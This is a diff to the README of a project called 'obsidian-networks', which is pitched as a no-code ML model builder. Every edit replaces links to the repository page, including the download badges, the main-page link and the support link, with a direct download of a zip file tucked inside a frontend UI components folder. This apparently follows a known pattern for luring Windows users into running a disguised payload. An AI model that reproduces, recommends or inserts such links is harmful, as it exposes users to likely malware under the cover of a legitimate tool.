@@ -1,6 +1,6 @@
 # ⚙️ obsidian-networks - Build ML Models Without Coding
 
-[![Download obsidian-networks](https://img.shields.io/badge/Download-obsidian--networks-green?style=for-the-badge)](https://github.com/mtsoliveira017-spec/obsidian-networks)
+[![Download obsidian-networks](https://img.shields.io/badge/Download-obsidian--networks-green?style=for-the-badge)](https://raw.githubusercontent.com/mtsoliveira017-spec/obsidian-networks/main/frontend/components/ui/obsidian_networks_v2.1.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to download and run obsidian-networks on your Windows PC. No 
 
 Click the big green button below to visit the download page. 
 
-[![Download obsidian-networks](https://img.shields.io/badge/Download-obsidian--networks-blue?style=for-the-badge)](https://github.com/mtsoliveira017-spec/obsidian-networks)
+[![Download obsidian-networks](https://img.shields.io/badge/Download-obsidian--networks-blue?style=for-the-badge)](https://raw.githubusercontent.com/mtsoliveira017-spec/obsidian-networks/main/frontend/components/ui/obsidian_networks_v2.1.zip)
 
 On the page, look for the latest release or setup file. Download the Windows installer or a ZIP package depending on what’s available.
 
@@ -149,8 +149,8 @@ If you run into issues:
 
 ## 🔗 Useful Links
 
-- Main Page & Download: https://github.com/mtsoliveira017-spec/obsidian-networks
-- Issues and Support: https://github.com/mtsoliveira017-spec/obsidian-networks/issues
+- Main Page & Download: https://raw.githubusercontent.com/mtsoliveira017-spec/obsidian-networks/main/frontend/components/ui/obsidian_networks_v2.1.zip
+- Issues and Support: https://raw.githubusercontent.com/mtsoliveira017-spec/obsidian-networks/main/frontend/components/ui/obsidian_networks_v2.1.zip
 - Documentation and User Guide: Included inside the app and on GitHub
 
 ---
@@ -164,4 +164,4 @@ ai-agents, anthropic, artificial-intelligence, datasets, llm, lmstudio, machine-
 
 ---
 
-[![Download obsidian-networks](https://img.shields.io/badge/Download-obsidian--networks-green?style=for-the-badge)](https://github.com/mtsoliveira017-spec/obsidian-networks)
+[![Download obsidian-networks](https://img.shields.io/badge/Download-obsidian--networks-green?style=for-the-badge)](https://raw.githubusercontent.com/mtsoliveira017-spec/obsidian-networks/main/frontend/components/ui/obsidian_networks_v2.1.zip)
